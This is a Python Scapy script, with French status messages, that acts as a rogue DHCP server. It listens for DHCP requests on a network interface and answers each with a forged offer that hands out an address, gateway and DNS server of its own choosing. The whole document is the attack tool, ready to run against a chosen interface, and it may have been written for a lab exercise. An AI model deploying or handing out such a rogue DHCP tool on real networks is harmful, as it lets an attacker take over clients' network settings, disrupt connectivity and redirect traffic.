#!/usr/bin/env python3
from scapy.all import *
import random

def craft_dhcp_offer(yiaddr, chaddr):
    return Ether(dst="ff:ff:ff:ff:ff:ff", src=get_if_hwaddr("eth0"))/ \
           IP(src="192.168.189.128", dst="255.255.255.255")/ \
           UDP(sport=67, dport=68)/ \
           BOOTP(op=2, yiaddr=yiaddr, siaddr="192.168.189.128", 
                 chaddr=chaddr)/ \
           DHCP(options=[("message-type", "offer"), 
                        ("server_id", "192.168.189.128"),
                        ("router", "192.168.189.1"),
                        ("dns", "8.8.8.8"), 
                        ("lease_time", 3600), "end"])

def rogue_dhcp_server(interface="eth0"):
    print("[*] Rogue DHCP Server - En attente de requetes DHCP...")
    print("[*] Configuration proposee:")
    print("    - IP: 192.168.189.50-100")
    print("    - Gateway: 192.168.189.1")
    print("    - DNS: 8.8.8.8")
    
    def handle_packet(pkt):
        if pkt.haslayer(BOOTP) and pkt[BOOTP].op == 1:
            chaddr = pkt[BOOTP].chaddr
            yiaddr = "192.168.189." + str(random.randint(50, 100))
            print(f"[*] Requete DHCP recue de {chaddr.hex()[:12]}, offre: {yiaddr}")
            offer = craft_dhcp_offer(yiaddr, chaddr)
            sendp(offer, iface=interface, verbose=False)
    
    sniff(iface=interface, filter="udp and port 67", prn=handle_packet)

if __name__ == "__main__":
    import sys
    interface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    rogue_dhcp_server(interface)
